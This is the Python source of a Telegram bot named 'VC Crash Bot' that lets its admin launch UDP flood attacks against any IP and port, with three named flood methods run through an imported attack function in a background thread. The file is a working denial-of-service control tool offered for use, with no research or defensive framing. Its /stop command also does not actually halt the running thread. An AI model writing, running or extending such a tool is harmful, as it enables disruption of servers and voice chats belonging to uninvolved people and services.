import threading
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes
)
from config import BOT_TOKEN, ADMIN_ID
from udp_flood import attack

active_attacks = {}

def is_admin(user_id):
    return user_id == ADMIN_ID

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *VC Crash Bot*\n\n"
        "Commands:\n"
        "`/flood <ip> <port> <method>`\n"
        "`/stop`\n\n"
        "Methods: `UDP-Flood` `UDP-Power` `UDP-Mix`",
        parse_mode="Markdown"
    )

# /flood <ip> <port> <method>
async def flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: `/flood <ip> <port> <method>`",
            parse_mode="Markdown"
        )
        return

    host = args[0]
    port = int(args[1])
    method = args[2]

    if method not in ["UDP-Flood", "UDP-Power", "UDP-Mix"]:
        await update.message.reply_text("❌ Invalid method.")
        return

    if user_id in active_attacks:
        await update.message.reply_text("⚠️ Attack already running. /stop first.")
        return

    await update.message.reply_text(
        f"🚀 Attack started!\n"
        f"Target: `{host}:{port}`\n"
        f"Method: `{method}`",
        parse_mode="Markdown"
    )

    t = threading.Thread(
        target=attack,
        args=(host, port, method),
        daemon=True
    )
    active_attacks[user_id] = t
    t.start()

# /stop
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    if user_id in active_attacks:
        active_attacks.pop(user_id)
        await update.message.reply_text("✅ Attack stopped.")
    else:
        await update.message.reply_text("No active attack.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("flood", flood))
    app.add_handler(CommandHandler("stop", stop))
    print("[*] Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()